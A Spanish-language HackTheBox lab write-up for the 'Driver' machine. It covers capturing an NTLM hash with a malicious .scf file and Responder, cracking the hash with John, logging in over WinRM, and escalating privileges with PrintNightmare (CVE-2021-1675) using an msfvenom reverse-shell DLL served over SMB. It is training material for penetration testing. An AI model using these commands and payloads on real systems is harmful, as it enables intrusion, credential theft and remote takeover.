---
title: Driver
published: 2025-03-10
image: "./logo.png"
tags: [Easy, Password Guessing, SCF Malicious File PrintNightmare, OSCP, eJPT]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Password Guessing
- SCF Malicious File
- Print Spooler Local Privilege Escalation (PrintNightmare) [CVE-2021-1675]

### Preparación

- OSCP (Escalada)
- eJPT

***

## Reconocimiento

Para empezar el escaneo, usaremos nmap:

```
sudo nmap -T4 --min-rate 1000 -p- -sCV -oN nmap_report 10.10.11.106
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FmrUI4W0trwBRUtc3VI55%2F1.png?alt=media&#x26;token=25a73e3e-2ba1-4734-b3ac-c1d876d3cc23" alt=""><figcaption></figcaption></figure>

Podemos ver el puerto **80**, **135**, **445** y **5985** abiertos, por lo que empezaremos por el servidor web.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F3aUSENOwQaJLAkay17Nd%2F2.png?alt=media&#x26;token=845ff116-84f1-4297-b582-b8cd6941b529" alt=""><figcaption></figcaption></figure>

### Web

De primeras nos pide credenciales pero usando **admin**:**admin** podemos entrar. Vamos a añadir el dominio que aparece al /etc/hosts.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FCDYgHwGzsevgV87JM5Wx%2F3.png?alt=media&#x26;token=321f768f-e27a-482b-8f54-adddb09b096e" alt=""><figcaption></figcaption></figure>

## Explotación

Por lo que podemos ver en este apartado podemos subir un **firmware** para que luego sea analizado por algún tester. Podemos probar a crear un archivo **.scf** (_Shell Command File_) con nuestra IP y nos pondremos a la escucha con el responder:

```sh
[Shell]  
Command=2  
IconFile=\\10.10.14.12\share\testing.ico  
[Taskbar]  
Command=ToggleDesktop
```

```bash
sudo responder -I tun0
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F1bRlqXHXmKGZEKB3P4xC%2F4.png?alt=media&#x26;token=7e897c4c-47ef-426e-a378-ba8d1a6a70c5" alt=""><figcaption></figcaption></figure>

### John The Ripper

Obtenemos el hash de un usuario llamado **tony**, por lo que nos lo guardaremos. También vamos a intentar crackearla con **jhon the ripper**.

```sh
john tony_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FfH15lYMxhWAkLiRRjmto%2F5.png?alt=media&#x26;token=c92f91fb-4e78-482f-b796-8de145408914" alt=""><figcaption></figcaption></figure>

Vemos que la contraseña es **liltony**, vamos a intentar acceder a **WinRM** (puerto 5985) con **Evil-WinRM**.

```sh
evil-winrm -i 10.10.11.106 -u tony -p liltony
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FXVIp8gXHZl8WfyAyh78i%2F6.png?alt=media&#x26;token=818caf67-5f7f-483e-b00f-d1b901f22bba" alt=""><figcaption></figcaption></figure>

Listo, vamos a ver la user flag.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FnqHu51oC5X0kbNni2Lim%2F7.png?alt=media&#x26;token=4b586a04-5ae9-4703-b418-85101b0f5ed7" alt=""><figcaption></figcaption></figure>

## Escalada de privilegios

Para la escalación podemos usar **WinPEAS**, para poder ver los posibles vectores de escalación.

```powershell
upload /home/zelpro/Tools/winPEASx64.exe
```

```powershell
./winPEASx64.exe
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FlPk7voz8sHrNiawqunqQ%2F8.png?alt=media&#x26;token=1ca56216-0e71-486e-b43f-45e57f085492" alt=""><figcaption></figcaption></figure>

Podemos ver algo interesante, hay bastante información de **Ricoh Printers**. Buscando por exploits, he encontrado un exploit: [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675).

Para comenzar debermos crear una reverse shell con **msfvenom** con extensión **.dll**


```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.34 LPORT=443 -f dll -o shell.dll
```

Ahora con **impacket** compartiremos este archivo con un servidor **smb**.

```sh
impacket-smbserver share .
```

Nos pondremos en escucha a la vez que ejecutamos el exploit.

```
nc -lvnp 443
```

```sh
python printnightmare.py driver/tony:liltony@10.10.11.106 '\\10.10.14.10\share\shell.dll'
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FoJ5IR9qqChh7lpFhmH2M%2F9.png?alt=media&#x26;token=0916569f-60d5-4ece-a8df-2c80ee8a9404" alt=""><figcaption></figcaption></figure>

Y ya podríamos obtener la root flag.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FQ1p6iPvv1VFRkYxDykru%2F10.png?alt=media&#x26;token=8a928108-815d-4a6b-bb64-0055d2915104" alt=""><figcaption></figcaption></figure>

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/387)

---